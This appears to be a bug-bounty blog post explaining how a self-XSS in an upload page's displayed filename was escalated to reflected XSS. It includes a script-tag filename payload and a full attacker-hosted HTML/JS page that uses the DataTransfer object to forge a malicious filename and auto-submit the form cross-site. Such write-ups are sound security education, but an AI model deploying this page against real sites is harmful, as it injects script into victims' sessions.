---
layout: post
title:  "Self-XSS to rXSS via Uploaded File Name"
date:   2021-02-09 12:00:00 -0700
categories: xss selfxss upload bugbounty
---

# Self-XSS to rXSS via Uploaded FileName

The other day I found a self XSS that could be escalated to a reflected XSS. The method for doing so used a Javascript object I'd never heard of before and I didn't find any examples specifically referencing bug bounty so I thought I'd share in case it helps anyone in the future.

##  The Self XSS

The upload page had code that looked like this:

```html
<html>
  <body>
    <form enctype="multipart/form-data" action="upload" method="POST">
      Upload file<input name="theFile" type="file">
      <input type="submit" value="Upload file now">
    </form>
  </body>
</html>
```

And upon POSTing the form, the name of the uploaded file was displayed on the page. So if you uploaded `RCE_Please.php` the resulting page displayed "Thanks for uploading RCE_Please.php".

The self XSS was easy - upload a file called `<script>alert(document.domain)</script>`.

## Escalating to Reflected XSS

**First attempt** - see if the reflected parameter can come from a GET request. No luck.

**Second attempt** - Use an `XMLHTTPRequest` to POST the required payload from an attacker controlled page. No luck because of CORS.

**Third attempt** - Use Javascript to set the contents of the form and the name of the uploaded file. This wasn't as easy as I thought it would be because there are browser level protections on modifying the input's `file` array. These protections ensure that attackers can't upload arbitrary files from a victim's computer. You can't even set defaults in HTML! I guess this is an okay feature to prevent browser user LFI attacks. After some Googling I found this [Stack Overflow answer](https://stackoverflow.com/questions/47119426/how-to-set-file-objects-and-length-property-at-filelist-object-where-the-files-a/47172409) which introduced me to the [DataTransfer Object](https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer).

Without further ado, this is the malicious HTML/JS that can be hosted by an attacker so that if a victim navigates to it, the rXSS will fire on the target domain.

```html

<html>
  <body>
    <form id="theForm" enctype="multipart/form-data" action="https://target.domain/upload" method="POST">
      <input id="theInput" name="theFile" type="file">
      <input type="submit" value="Upload file now">
    </form>
    <script>
      setTimeout(() => {
        const f = document.getElementById("theForm");
        const i = document.getElementById("theInput");
        const dt = new DataTransfer()
        const files = [
          new File(['content'], 'maliciousfilename.txt<img src=x onerror=alert(document.domain)>')
        ];

        files.forEach(f => dt.items.add(f));
        i.files = dt.files;

        f.submit();
      }, 1000);
    </script>
  </body>
  </html>

```

The `setTimeout` is just there so the triager can see the attacker's page before being redirected.

## Conclusion

This was new to me, so I hope it was new to you and comes in handy one day. Happy Hunting friends!
